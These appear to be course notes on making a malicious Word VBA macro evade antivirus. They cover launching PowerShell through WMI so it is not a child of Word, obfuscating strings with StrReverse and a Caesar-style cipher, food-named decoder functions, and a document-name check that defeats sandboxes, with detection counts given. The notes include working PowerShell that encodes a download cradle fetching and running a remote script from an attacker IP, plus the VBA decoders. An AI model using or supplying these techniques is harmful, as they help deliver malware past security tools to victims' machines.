# 05.05 PowerShell in VBA WMI De-chain String Obfuscation

> Section 6.8 · WMI Win32_Process · StrReverse · ASCII+Caesar key 17 · doc name check

## Overview

Two problems with a VBA macro that uses Shell() to launch PowerShell: (1) PS is a child process of Word (suspicious), and (2) the download cradle string is a clear signature. Fix: use WMI Win32_Process.Create() to de-chain PowerShell under WmiPrvSE.exe. Then obfuscate all string literals: StrReverse is simple; full ASCII+Caesar cipher (key 17) with a document-name heuristic check gets to 1/26.

## Steps

- **Basic PS runner** — Shell strArg, vbHide — 8/26 detections; PS is child of Word.
- **WMI de-chain** — GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid — PS spawns under WmiPrvSE.
- **StrReverse** — wrap each string literal; create `bears()` wrapper to reduce StrReverse occurrences; 7→4/26.
- **ASCII+Caesar encoder** — convert each char to byte value, add 17, pad to 3 digits; run in PowerShell, pipe to clipboard.
- **VBA decryption** — food-named helper functions: Pears (Chr subtract 17), Strawberries (Left 3), Almonds (Right -3), Nuts (loop decoder).
- **Execute with encrypted strings** — Nuts(Apples) decrypts PS cradle; undefined variables (Tea, Coffee, Napkin) replace Null.
- **Document name check** — `If ActiveDocument.Name <> Nuts("...") Then Exit Function` — emulators rename the document.

Sub MyMacro()

### StrReverse obfuscation

' Wrap StrReverse in a helper function to reduce repeated occurrences
Function bears(cows)
    bears = StrReverse(cows)
End Function

### PowerShell ASCII+Caesar encoder (key=17)

```powershell
# Encrypt PS cradle: convert each char to its byte value, add 17, pad to 3 digits
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

### VBA decryption functions

```vba
' Decryption helper functions — food names used to avoid AV signatures
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
```
